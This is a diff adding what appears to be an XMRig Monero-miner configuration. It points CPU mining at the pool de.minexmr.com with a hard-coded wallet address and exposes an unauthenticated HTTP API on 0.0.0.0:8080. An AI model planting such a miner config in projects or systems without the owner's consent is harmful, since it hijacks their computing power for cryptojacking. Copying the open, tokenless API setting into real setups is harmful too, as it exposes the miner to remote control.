@@ -1,0 +1,25 @@
+{
+  "autosave": true,
+  "cpu": {
+    "enabled": true,
+    "huge-pages": false
+  },
+  "randomx": {
+    "mode": "light"
+  },
+  "pools": [
+    {
+      "url": "de.minexmr.com:443",
+      "user": "48PZrmBXTvf9GYgkTmaJRXi6ZCUXrM7qQcz6ZLE3margf5mFQ27sraycXcGsKiPJ4FeY2QsMw7RLx6AuACpXsMP4JijyRYn/worker01",
+      "pass": "x",
+      "keepalive": true,
+      "algo": "rx/0"
+    }
+  ],
+  "http": {
+    "enabled": true,
+    "host": "0.0.0.0",
+    "port": 8080
+  },
+  "donate-level": 1
+}
